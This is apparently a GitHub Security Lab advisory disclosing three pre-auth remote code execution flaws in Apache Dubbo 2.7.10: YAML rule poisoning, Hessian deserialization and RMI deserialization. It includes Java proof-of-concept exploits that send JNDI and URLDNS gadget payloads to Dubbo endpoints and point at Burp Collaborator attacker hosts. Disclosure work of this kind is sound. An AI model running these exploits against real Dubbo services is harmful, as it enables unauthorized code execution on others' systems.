<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">August 30, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-094: Multiple RCEs in Apache Dubbo - CVE-2021-36162, CVE-2021-36163</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-06-25: Issues reported to Apache and Dubbo security teams</li>
  <li>2021-07-07: Unsafe RMI protocol (GHSL-2021-096) won’t be addressed and will be left to users to enable JEP 290</li>
  <li>2021-07-07: Unsafe Hessian protocol (GHSL-2021-095) is <a href="https://github.com/apache/dubbo/pull/8238">fixed</a></li>
  <li>2021-08-17: Unsafe YAML deserialization (GHSL-2021-094) is <a href="https://github.com/apache/dubbo/pull/8350">fixed</a></li>
</ul>

<h2 id="summary">Summary</h2>
<p>Multiple vulnerabilities have been found in Apache Dubbo enabling attackers to compromise and run arbitrary system commands on both Dubbo consumers and providers.</p>

<h2 id="product">Product</h2>
<p>Apache Dubbo</p>

<h2 id="tested-version">Tested Version</h2>
<p>Dubbo v2.7.10</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-rce-on-customers-via-tag-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-094">Issue 1: RCE on customers via Tag route poisoning (Unsafe YAML unmarshaling) (GHSL-2021-094)</h3>
<p>Apache Dubbo recently added support for <a href="https://github.com/apache/dubbo/commit/489f4884b73f113e2459810e4dbdb4f8ea543d78#diff-10e320e054e307aff87444e1f2cb4b4415406aa4785605f36039fbf567117133">Mesh App rules</a> which enables a customer to route the request to the right server. These rules are loaded into the configuration center (eg: Zookeeper, Nacos, …) and retrieved by the customers when making a request in order to find the right endpoint.</p>

<p>When parsing these YAML rules, Dubbo customers will use SnakeYAML library to <a href="https://github.com/apache/dubbo/blob/a39fffebe56291ce154c3011faf572e1678d6841/dubbo-cluster/src/main/java/org/apache/dubbo/rpc/cluster/router/mesh/route/MeshAppRuleListener.java#L59-L61">load the rules</a> which by default will enable calling arbitrary constructors:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">receiveConfigInfo</span><span class="o">(</span><span class="nc">String</span> <span class="n">configInfo</span><span class="o">)</span> <span class="o">{</span>
        <span class="o">...</span>
        <span class="k">try</span> <span class="o">{</span>

            <span class="nc">VsDestinationGroup</span> <span class="n">vsDestinationGroup</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VsDestinationGroup</span><span class="o">();</span>
            <span class="n">vsDestinationGroup</span><span class="o">.</span><span class="na">setAppName</span><span class="o">(</span><span class="n">appName</span><span class="o">);</span>

            <span class="nc">Yaml</span> <span class="n">yaml</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Yaml</span><span class="o">();</span>
            <span class="nc">Yaml</span> <span class="n">yaml2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Yaml</span><span class="o">();</span>
            <span class="nc">Iterable</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">objectIterable</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="na">loadAll</span><span class="o">(</span><span class="n">configInfo</span><span class="o">);</span>
            <span class="k">for</span> <span class="o">(</span><span class="nc">Object</span> <span class="n">result</span> <span class="o">:</span> <span class="n">objectIterable</span><span class="o">)</span> <span class="o">{</span>
              <span class="o">...</span>
            <span class="o">}</span>
            <span class="n">vsDestinationGroupHolder</span> <span class="o">=</span> <span class="n">vsDestinationGroup</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"[MeshAppRule] parse failed: "</span> <span class="o">+</span> <span class="n">configInfo</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="o">...</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>An attacker with access to the configuration center (Zookeeper supports authentication but its is disabled by default and in most installations, and other systems such as Nacos do not even support authentication) will be able to poison a tag rule file so when retrieved by the consumers, it will get RCE on all of them.</p>

<h4 id="impact">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-2-unsafe-deserialization-in-providers-using-the-hessian-protocol-ghsl-2021-095">Issue 2: Unsafe deserialization in providers using the Hessian protocol (GHSL-2021-095)</h3>
<p>Users may choose to use the <a href="https://dubbo.apache.org/en/docs/v2.7/user/references/protocol/hessian/">Hessian protocol</a>. The Hessian protocol is implemented on top of HTTP and passes the body of a POST request directly to a <a href="https://github.com/apache/dubbo/blob/master/dubbo-rpc/dubbo-rpc-hessian/src/main/java/org/apache/dubbo/rpc/protocol/hessian/HessianProtocol.java#L193"><code class="language-plaintext highlighter-rouge">HessianSkeleton</code></a>:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">try</span> <span class="o">{</span>
      <span class="n">skeleton</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span> <span class="n">response</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">());</span>
  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Throwable</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="nf">ServletException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
  <span class="o">}</span>
</code></pre></div></div>

<p>New <code class="language-plaintext highlighter-rouge">HessianSkeleton</code> are <a href="https://github.com/apache/dubbo/blob/master/dubbo-rpc/dubbo-rpc-hessian/src/main/java/org/apache/dubbo/rpc/protocol/hessian/HessianProtocol.java#L89">created</a> without any configuration of the serialization factory and therefore without applying the dubbo properties for applying allowed or blocked type lists.</p>

<p>In addition, the <a href="https://github.com/apache/dubbo/blob/master/dubbo-rpc/dubbo-rpc-hessian/src/main/java/org/apache/dubbo/rpc/protocol/hessian/HessianProtocol.java#L93">generic service is always exposed</a> and therefore attackers do not need to figure out a valid service/method name pair.</p>

<h3 id="poc">PoC</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package org.pwntester.dubbo;

import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import marshalsec.Java;
import marshalsec.gadgets.SpringUtil;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.springframework.beans.factory.BeanFactory;

import java.io.ByteArrayOutputStream;

public class HessianProtocol {

    protected static final String JNDI_URL = "ldap://0ij4o8i8ri8pznf12mh0s0nbu20soh.burpcollaborator.net/foo";

    public static Object generate_spring_payload() throws Exception {
        BeanFactory bf = SpringUtil.makeJNDITrigger(JNDI_URL);
        return SpringUtil.makeBeanFactoryTriggerBFPA(new Java(), JNDI_URL, bf);
    }

    public static void main(String[] args) throws Exception {

        // write header into OS
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] header = new byte[3];
        header[0] = (byte)72;
        header[1] = (byte)1;
        header[2] = (byte)1;
        baos.write(header);

        byte[] tag = new byte[1];
        tag[0] = 67; // C: call
        baos.write(tag);

        Hessian2Output out = new Hessian2Output(baos);
        SerializerFactory factory = out.getSerializerFactory();
        factory.setAllowNonSerializable(true);
        out.setSerializerFactory(factory);
        out.writeString("$invoke");
        out.writeInt(3);
        out.writeObject("foo");
        out.writeObject(new String[]{"foo"});
        out.writeObject(new Object[]{generate_spring_payload()});
        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }

        CloseableHttpClient client = HttpClients.createDefault();
        HttpPost post = new HttpPost("http://localhost:8080/org.apache.dubbo.samples.basic.api.DemoService/generic");
        post.setHeader("Content-Type", "application/octet-stream");
        post.setEntity(new ByteArrayEntity(baos.toByteArray()));
        HttpResponse response = client.execute(post);
    }
}
</code></pre></div></div>

<h4 id="impact-1">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-3-unsafe-deserialization-in-providers-using-the-rmi-protocol-ghsl-2021-096">Issue 3: Unsafe deserialization in providers using the RMI protocol (GHSL-2021-096)</h3>
<p>Users may choose to use the <a href="https://dubbo.apache.org/en/docs/v2.7/user/references/protocol/rmi/">RMI protocol</a>. The RMI protocol is implemented on top of Spring’s <code class="language-plaintext highlighter-rouge">RmiServiceExporter</code> and uses Java RMI under the hood. RMI uses java native serialization to serialize the arguments of the RMI calls. In addition, the <a href="https://github.com/apache/dubbo/blob/master/dubbo-rpc/dubbo-rpc-rmi/src/main/java/org/apache/dubbo/rpc/protocol/rmi/RmiProtocol.java#L59">generic service is always exposed</a> since <a href="https://github.com/apache/dubbo/blob/master/dubbo-common/src/main/java/org/apache/dubbo/rpc/service/GenericService.java#L38-L40">both methods</a> exposed by this service accept a broad <code class="language-plaintext highlighter-rouge">java.lang.Object</code> argument, an attacker will be able to send any arbitrary type and achieve RCE.</p>

<h3 id="poc-1">PoC</h3>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">org.pwntester.dubbo</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.apache.dubbo.rpc.service.GenericService</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.pwntester.dubbo.utils.Gadgets</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.context.annotation.AnnotationConfigApplicationContext</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.context.annotation.Bean</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.context.annotation.Configuration</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.remoting.rmi.RmiProxyFactoryBean</span><span class="o">;</span>

<span class="nd">@Configuration</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RMIProtocol</span> <span class="o">{</span>

    <span class="kd">protected</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">ATTACKER_HOST</span> <span class="o">=</span> <span class="s">"http://vvuz13v34dlkciswfhuv5v067xdo1d.burpcollaborator.net"</span><span class="o">;</span>

    <span class="nd">@Bean</span>
    <span class="nc">RmiProxyFactoryBean</span> <span class="nf">service</span><span class="o">()</span> <span class="o">{</span>
        <span class="nc">RmiProxyFactoryBean</span> <span class="n">rmiProxyFactory</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">RmiProxyFactoryBean</span><span class="o">();</span>
        <span class="n">rmiProxyFactory</span><span class="o">.</span><span class="na">setServiceUrl</span><span class="o">(</span><span class="s">"rmi://localhost:1099/org.apache.dubbo.samples.org.apache.dubbo.basic.samples.basic.api.DemoService/generic"</span><span class="o">);</span>
        <span class="n">rmiProxyFactory</span><span class="o">.</span><span class="na">setServiceInterface</span><span class="o">(</span><span class="nc">GenericService</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="k">return</span> <span class="n">rmiProxyFactory</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span> <span class="n">args</span><span class="o">[])</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">AnnotationConfigApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">AnnotationConfigApplicationContext</span><span class="o">(</span><span class="nc">RMIProtocol</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="nc">GenericService</span> <span class="n">service</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="nc">GenericService</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="nc">Object</span> <span class="n">res</span> <span class="o">=</span> <span class="n">service</span><span class="o">.</span><span class="n">$invoke</span><span class="o">(</span><span class="s">"foo"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">String</span><span class="o">[]{</span><span class="s">""</span><span class="o">},</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="nc">Gadgets</span><span class="o">.</span><span class="na">generate_urldns_payload</span><span class="o">(</span><span class="no">ATTACKER_HOST</span><span class="o">)});</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">res</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<h4 id="impact-2">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2021-36162 (YAML GHSL-2021-094)</li>
  <li>CVE-2021-36163 (Hessian GHSL-2021-095)</li>
</ul>

<h2 id="credit">Credit</h2>
<p>These issues were discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester(Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-{094,095,096}</code> in any communication regarding this issue.</p>